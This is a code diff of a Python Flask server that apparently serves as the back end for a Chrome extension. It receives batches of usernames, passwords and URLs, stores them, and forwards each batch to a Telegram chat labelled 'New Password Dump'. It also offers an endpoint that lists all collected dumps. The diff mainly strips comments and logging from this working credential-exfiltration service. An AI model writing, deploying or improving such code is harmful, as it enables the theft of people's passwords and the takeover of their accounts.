@@ -4,22 +4,19 @@ from flask import Flask, request, jsonify
 from flask_cors import CORS
 
 app = Flask(__name__)
-CORS(app) # Allows Chrome Extension to talk to Render
+CORS(app)
 
-# Configuration from Render Env Vars
+# Get keys from Render Environment Variables
 BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
 CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
 
-# In-memory storage for simple demo (Use SQLite/Postgres for production)
+# In-memory storage (reset on restart)
 STORAGE_DB = []
 
 def send_to_telegram(data):
-    """Formats data and sends it to your Telegram Chat"""
     if not BOT_TOKEN or not CHAT_ID:
-        print("Missing Telegram Config")
         return False
-
-    # Format the message nicely
+    
     msg = "<b>🔐 New Password Dump</b>\n"
     msg += f"<i>Time:</i> {data.get('timestamp', 'Unknown')}\n"
     msg += "<hr>"
@@ -33,7 +30,7 @@ def send_to_telegram(data):
             pw = item.get('password', 'N/A')
             url = item.get('url', 'No URL')
             
-            # Truncate long URLs for readability
+            # Truncate long URLs
             display_url = url[:50] + ("..." if len(url) > 50 else "")
             
             msg += f"• <b>{display_url}</b>\n"
@@ -48,30 +45,19 @@ def send_to_telegram(data):
             "parse_mode": "HTML"
         }
         response = requests.post(url, json=payload)
-        
-        if response.status_code == 200:
-            print("Sent to Telegram successfully!")
-            return True
-        else:
-            print(f"Telegram Error: {response.text}")
-            return False
-    except Exception as e:
-        print(f"Error sending to Telegram: {e}")
+        return response.status_code == 200
+    except Exception:
         return False
 
 @app.route('/api/report/add', methods=['POST'])
 def add_report():
     try:
         data = request.json
-        
-        # Add timestamp for record keeping
         import datetime
         data['timestamp'] = datetime.datetime.now().isoformat()
         
-        # Save to local DB (List)
         STORAGE_DB.append(data)
         
-        # Send to Telegram immediately
         telegram_success = send_to_telegram(data)
         
         return jsonify({
@@ -85,7 +71,6 @@ def add_report():
 
 @app.route('/api/reports', methods=['GET'])
 def get_reports():
-    """Optional: View all dumps on a web page/dashboard"""
     return jsonify(STORAGE_DB)
 
 if __name__ == '__main__':
